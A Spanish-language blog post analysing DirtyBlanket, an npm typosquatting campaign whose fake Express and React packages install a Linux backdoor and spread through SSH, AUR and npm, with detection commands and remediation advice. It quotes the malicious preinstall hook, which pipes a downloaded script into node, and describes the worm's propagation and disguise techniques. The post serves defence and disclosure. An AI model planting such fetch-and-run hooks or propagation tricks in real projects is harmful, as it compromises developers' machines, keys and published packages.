---
title: "DirtyBlanket: un gusano de Linux escondido en falsos paquetes de Express"
description: "Nueve paquetes de npm que imitan a Express y React instalan una puerta trasera en Linux y se propagan solos por SSH, AUR y npm. Qué ha pasado, cómo funciona y cómo comprobar si te afecta."
pubDate: 2026-10-09
tags: ["Node.js", "Tools"]
ogImage: "https://baumannzone-dev-og.vercel.app/api/og?title=DirtyBlanket%3A%20un%20gusano%20de%20Linux%20escondido%20en%20falsos%20paquetes%20de%20Express&tags=Node.js,Tools"
relatedPosts:
  - "entendiendo-package-json-una-guia-para-dummies"
---

Escribes `npm install`, te equivocas en una letra y, sin enterarte, acabas de regalarle una shell de tu máquina a un desconocido. Y de paso, tus claves SSH, tus servidores y los paquetes que mantienes en npm.

Eso es, resumido, lo que hace **DirtyBlanket**, una campaña descubierta por [SafeDep](https://safedep.io/dirtyblanket-express-impersonation-npm/) a finales de septiembre de 2026.

## Qué ha pasado

El 29 de septiembre de 2026, una cuenta de npm llamada `dirtyblanket` publicó nueve paquetes en 33 minutos. Ocho copian a Express y uno a React: mismo código, mismos metadatos y la misma versión que el paquete original. Lo único que cambia es una línea añadida en el `package.json`.

| Paquete | Versión | Imita a |
| --- | --- | --- |
| `xeprews` | 5.2.1 | Express |
| `express-javascript` | 5.2.1 | Express |
| `express-nodejs` | 5.2.1 | Express |
| `exprdd` | 5.2.1 | Express |
| `exprrdd` | 5.2.1 | Express |
| `exptrdd` | 5.2.1 | Express |
| `exptred` | 5.2.1 | Express |
| `exptredd` | 5.2.1 | Express |
| `react-nodejs` | 19.3.0 | React |

Es typosquatting de manual: nombres que salen de un error de tecleo (`exptred`) o que suenan a paquete oficial (`express-nodejs`, `react-nodejs`).

## Cómo funciona

Todo empieza con un hook `preinstall`, que npm ejecuta automáticamente antes de instalar el paquete:

```json
"preinstall": "curl https://web.archive.org/web/<repo-de-codeberg>/node.js | node"
```

A partir de ahí, en Linux, la cadena es esta:

1. El hook descarga un script llamado `node.js` a través de la Wayback Machine y lo ejecuta con `node`.
2. Ese script descarga el gusano, `linux.sh`, desde Codeberg y lo ejecuta con `bash`.
3. El gusano instala una puerta trasera disfrazada de servicio de fuentes de systemd. Por dentro es [CHAOS](https://github.com/tiagorlampert/CHAOS), una herramienta de acceso remoto de código abierto, que se comunica por Tor y permite al atacante abrir una shell, leer y escribir ficheros y hacer capturas de pantalla.
4. Recorre todas las claves SSH privadas de la máquina e intenta entrar en cada host de `known_hosts`. Donde entra, se ejecuta de nuevo.
5. Con esas mismas claves, modifica los paquetes del AUR (Arch User Repository) que el usuario mantenga para que instalen el gusano.
6. Con los tokens de npm que encuentra, publica versiones nuevas de los paquetes del usuario con el mismo hook malicioso.

Cada servidor, cada paquete de AUR y cada versión de npm infectada vuelve a empezar la cadena. Por eso es un gusano y no un simple paquete malicioso: una vez suelto, ya no necesita que nadie se equivoque al teclear.

## Los detalles que lo hacen interesante

**La Wayback Machine como CDN de malware.** El primer script no se descarga directamente de Codeberg, sino de la copia archivada en `web.archive.org`. La petición que dispara `npm install` va a Internet Archive, un dominio que casi nadie bloquea, y la copia sigue ahí aunque borren el repositorio original. Cuando se propaga, el gusano también tira de esa URL archivada.

**El código malicioso no está en el paquete.** El paquete solo contiene la línea que lo descarga. Sin versión fijada ni comprobación de integridad, el atacante puede cambiar lo que se ejecuta cuando quiera.

**Se camufla como parte del sistema.** Con root, el binario acaba en `/usr/lib/systemd/systemd-fontrenderd`, junto a los binarios reales de systemd, con un servicio llamado "Font Rendering Service". Además marca los ficheros como inmutables (`chattr +i`), así que ni root puede borrarlos sin quitar antes esa marca. Sin root, se instala como servicio de usuario (`~/.config/systemd/user/`), con el binario en `~/.config/systemd/systemd-fontcached`.

**No deja rastro en tu repositorio.** Al infectar tus paquetes de npm, añade el hook, sube la versión patch, publica y restaura tu `package.json` original. En local no ves ningún cambio; en el registro hay una versión nueva que tú no has publicado.

**Suplanta al mantenedor en AUR.** Los commits usan el nombre y el email del último autor y el mensaje habitual de una actualización, así que parecen una subida de versión rutinaria.

## A quién afecta

Solo a Linux. En macOS y Windows el script no hace nada, aunque incluye una rama de PowerShell comentada, lo que apunta a que el soporte para Windows está en camino.

Dos matices importantes:

- **WSL cuenta como Linux.** El gusano también busca claves SSH, `known_hosts` y `.npmrc` de los usuarios de Windows en `/mnt/c/Users/*`.
- **Los runners de CI también.** Muchos corren Linux, a menudo como root y con tokens de publicación.

Y dos límites del propio gusano: solo puede usar claves SSH **sin passphrase**, y no puede conectarse a los hosts si `known_hosts` está hasheado (`HashKnownHosts yes`).

## Cómo comprobar si te afecta

Busca los nombres en tus dependencias:

```bash
grep -rEl "xeprews|express-javascript|express-nodejs|react-nodejs|exprdd|exprrdd|exptrdd|exptredd|exptred" \
  --include=package.json --include=package-lock.json \
  --include=pnpm-lock.yaml --include=yarn.lock . 2>/dev/null
```

Y comprueba si existen los servicios falsos:

```bash
ls -la /usr/lib/systemd/systemd-fontrenderd ~/.config/systemd/systemd-fontcached 2>/dev/null
systemctl status systemd-fontrenderd.service 2>/dev/null
systemctl --user status systemd-fontrenderd.service systemd-fontcached.service 2>/dev/null
```

Si mantienes paquetes en npm o en AUR, revisa también que no haya versiones o commits recientes que no sean tuyos.

## Qué hacer si lo has instalado

No basta con desinstalar el paquete. La recomendación de SafeDep es tratar la máquina y todas las claves y tokens que hubiera en ella como comprometidos. En la práctica:

1. Desconecta la máquina de la red.
2. Revoca los tokens de npm y genera otros nuevos.
3. Sustituye las claves SSH y retira las antiguas de servidores, GitHub, GitLab, AUR y compañía.
4. Revisa los hosts de tu `known_hosts`: si alguna de tus claves entraba, el gusano también.
5. Comprueba las versiones publicadas de tus paquetes en npm y los últimos commits de tus paquetes en AUR.
6. Reinstala la máquina. Con una puerta trasera que da shell remota, limpiarla a mano es fiarse demasiado.

## Cómo protegerte de la siguiente

Porque habrá siguiente.

- **Desactiva los scripts de instalación por defecto.** Con `ignore-scripts=true` en tu `.npmrc`, los hooks como `preinstall` no se ejecutan. Algún paquete con binarios nativos se quejará, y ahí decides tú a cuál le das permiso.
- **Pon passphrase a tus claves SSH.** Este gusano no puede usar las que la tienen.
- **Hashea tu `known_hosts`** con `HashKnownHosts yes` en la configuración de SSH.
- **Usa tokens de npm con el mínimo alcance posible** y activa 2FA para publicar.
- **Lee el nombre del paquete antes de pulsar Enter.** Copiar el comando desde la documentación oficial sigue siendo la defensa más barata que existe.

## Fuentes

- [DirtyBlanket: Fake Express Packages on npm Spread a Linux Worm](https://safedep.io/dirtyblanket-express-impersonation-npm/), análisis original de SafeDep, con el código del gusano y la lista completa de indicadores de compromiso.
- [ossf/malicious-packages #1564](https://github.com/ossf/malicious-packages/pull/1564) y [#1579](https://github.com/ossf/malicious-packages/pull/1579), los informes en la base de datos de paquetes maliciosos de OpenSSF.
